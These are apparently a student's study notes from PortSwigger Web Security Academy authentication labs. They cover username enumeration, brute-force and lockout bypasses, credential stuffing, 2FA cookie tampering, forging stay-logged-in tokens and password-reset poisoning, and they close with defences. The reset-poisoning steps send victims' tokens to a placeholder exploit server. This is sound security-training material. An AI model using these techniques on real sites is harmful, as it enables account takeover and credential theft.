# Authentication Vulnerabilities
**Source:** PortSwigger Web Security Academy
**Status:** ✅ Completed
**Date:** August 2026

-------------

# Authentication Vulnerabilities
**Source:** PortSwigger Web Security Academy  
**Status:** ✅ Completed  
**Date:** August 2026  
**Author:** [l1m1nal_3ntr0py](https://github.com/l1m1nal-3ntr0py)

---

## Table of Contents
1. [What is Authentication?](#what-is-authentication)
2. [Username Enumeration](#username-enumeration)
3. [Brute Force Attacks](#brute-force-attacks)
4. [HTTP Basic Authentication](#http-basic-authentication)
5. [Multi-Factor Authentication (2FA)](#multi-factor-authentication)
6. [Stay Logged In Tokens](#stay-logged-in-tokens)
7. [Password Reset Vulnerabilities](#password-reset-vulnerabilities)
8. [Change Password Vulnerabilities](#change-password-vulnerabilities)
9. [Defence & Prevention](#defence--prevention)

---

## What is Authentication?

Authentication verifies **who you are** using three factors:

| Factor | Type | Example |
|---|---|---|
| Something you **know** | Knowledge factor | Password, security question |
| Something you **have** | Possession factor | Phone, security token |
| Something you **are** | Inherence factor | Biometrics, behaviour patterns |

---

## Username Enumeration

Finding valid usernames before attacking passwords.

### Methods

**1. Status Codes**
- Different HTTP status codes for valid vs invalid usernames
- Valid user → different response code

**2. Error Messages**
- Subtle differences in error text
- `"Invalid username"` vs `"Invalid username or password"`
- Even one character difference is enough to enumerate

**3. Response Timing**
- If username is correct → server checks password → takes longer
- If username is wrong → server rejects immediately → faster response
- **Exploit:** Add very long password string to amplify timing difference

### Tools
- Burp Intruder → Settings → Grep & Extract → add error message → monitor subtle changes

### Bypass IP Block
```
X-Forwarded-For: [your-ip]
```
Use **Pitchfork attack** to simultaneously change both the header and payload positions.

---

## Brute Force Attacks

### Password Patterns Users Follow
- `mypassword` → `Mypassword1!` → `Myp4$$w0rd`
- Regular changes → `Mypassword1!` → `Mypassword1?` → `Mypassword2!`

### IP Block Bypass
- If successful login **resets** the IP counter:
  - Add your own valid credentials at **regular intervals** in the payload
  - Use **Pitchfork attack** — username list + password list with your creds interspersed

### Account Lockout Enumeration
- Accounts lock after N failed attempts (e.g. 3 attempts)
- **Exploit:**
  1. Use a password list smaller than the lockout limit (e.g. 3 passwords if limit is 4)
  2. Try these passwords against a **large list of usernames**
  3. Not targeting one user — catching any user with that common password
  4. Locked account = valid username confirmed

> **Tip:** Even after lockout, correct password may return a **different error** — run full credential stuffing to find it

### Credential Stuffing
- Use **leaked database credentials** — many users reuse passwords across sites
- Try once per account = no lockout triggered
- Use **Cluster Bomb** attack in Burp:
  - Payload 1: Username list
  - Payload 2: Empty string (null payload) × number of attempts needed

### User Rate Limiting
Rate limits reset via:
- User completing a CAPTCHA
- Administrator manually resetting
- Automatic timeout after a period

---

## HTTP Basic Authentication

```
Authorization: Basic base64(username:password)
```

- Sent in **every request**
- Not secure unless HTTPS + HSTS implemented
- Vulnerable to:
  - Man-in-the-middle attacks
  - Brute force
  - CSRF/session attacks

---

## Multi-Factor Authentication

### True vs False 2FA

| Type | True 2FA? | Why |
|---|---|---|
| Email code | ❌ No | Both factors are "something you know" |
| SMS code | ⚠️ Technically yes | But vulnerable to SIM swapping |
| Authenticator app | ✅ Yes | Separate device generates code |
| Hardware token (RSA) | ✅ Yes | Dedicated physical device |

### Bypassing 2FA

**Method 1 — Skip the second step:**
- Complete first auth (password)
- Directly navigate to the logged-in page URL
- Some sites only check first factor, not second

**Method 2 — Flawed cookie logic:**
```http
POST /login-steps/second HTTP/1.1
Host: vulnerable-website.com
Cookie: account=carlos         ← change this to victim username
verification-code=123456
```
- Server blindly trusts the cookie to determine which account to authenticate
- Change `account=carlos` to `account=victim-user`
- Brute force the 6-digit code → Burp Macros or Turbo Intruder

---

## Stay Logged In Tokens

### How They Work
- Special persistent cookie keeping user logged in after browser close
- Should be **completely unpredictable**

### Common Weak Token Patterns
```
base64(username:md5(password))
base64(username:timestamp)
```

### Attack Steps
1. Create your own account with "Stay logged in" enabled
2. Find and decode your persistent cookie
3. Identify the pattern (base64 → md5 hash etc.)
4. Use **CrackStation** to reverse the MD5 hash
5. Reconstruct tokens for other users

### Burp Intruder Payload Processing Rules (in order):
1. Hash → MD5
2. Add prefix → `carlos:`
3. Encode → Base64

### XSS + Stay Logged In
- If XSS found → steal victim's persistent cookie
- Decode the cookie → may reveal their **real password**

> **Why salt matters:** Well-known password hashes exist all over the internet — salting prevents precomputed rainbow table attacks

---

## Password Reset Vulnerabilities

### Insecure Reset Methods
- ❌ Sending new password in email (not secure — email isn't encrypted)
- ❌ Predictable reset URLs:
```
/reset-password?user=victim-user
```

### Secure Reset URL Pattern
```
/reset-password?token=a0ba0d1cb3b63d13822572fcff1a241895d893f659164d4cc550b421ebdd48a8
```
- Token should not reveal user identity
- Token should expire immediately after use

### Password Reset Poisoning via Middleware

**Normal flow:**
```
Your request → Host: lab.com
Server builds → https://lab.com/reset?token=abc
Carlos gets email → clicks → token goes to lab.com ✅
```

**Poisoned flow:**
```
Your request → Host: lab.com
               X-Forwarded-Host: YOUR-EXPLOIT-SERVER.net

Server trusts middleware header
Server builds → https://YOUR-EXPLOIT-SERVER.net/reset?token=abc

Carlos clicks → token lands on YOUR server! 💀
```

**Step by step exploit:**
```
Step 1:
POST /forgot-password
username=carlos
X-Forwarded-Host: exploit-server.net

Step 2:
Carlos receives email with your exploit server link
Carlos clicks → token appears in YOUR server logs
GET /?token=SECRET

Step 3:
Visit https://LAB-URL/reset?token=SECRET
Reset carlos password → login as carlos ✅
```

**Key header:**
```
X-Forwarded-Host: YOUR-EXPLOIT-SERVER-URL
```

---

## Change Password Vulnerabilities

- Change password functions work like login pages
- All brute force and enumeration techniques apply here too
- If username is in a **hidden field** → change it to target another user
- Error messages reveal whether old password was correct or not

---

## Defence & Prevention

### Credential Protection
- Always use HTTPS — never downgrade to HTTP
- Never expose usernames/emails publicly
- Use identical error messages for all auth failures
- Make response times indistinguishable between valid/invalid users

### Brute Force Protection
- IP-based rate limiting
- CAPTCHA after N failed attempts
- Account lockout with careful implementation
- Use `zxcvbn` library (by Dropbox) for real-time password strength checking

### 2FA Best Practices
- Use dedicated authenticator apps or hardware tokens
- Never rely on SMS (SIM swapping risk)
- Email-based OTP is NOT true 2FA
- Triple-check all verification logic — a single flaw = full bypass

### Key Principle
> **Every auth-related function is an attack surface** — login, forgot password, change password, account creation. Not just the main login page.

---

## Quick Reference — Attack Cheatsheet

| Vulnerability | Tool | Technique |
|---|---|---|
| Username enum | Burp Intruder | Grep & Extract on error messages |
| IP block bypass | Burp | X-Forwarded-For header |
| Account lockout enum | Burp Cluster Bomb | Null payload × attempt count |
| Stay logged in | Burp Intruder | MD5 → prefix → Base64 payload rules |
| 2FA bypass | Browser | Direct URL navigation after step 1 |
| Reset poisoning | Burp Repeater | X-Forwarded-Host header |
| Hash cracking | CrackStation | Paste MD5 hash → get plaintext |

---

*Notes by [l1m1nal_3ntr0py](https://github.com/l1m1nal-3ntr0py) | PortSwigger Web Security Academy*

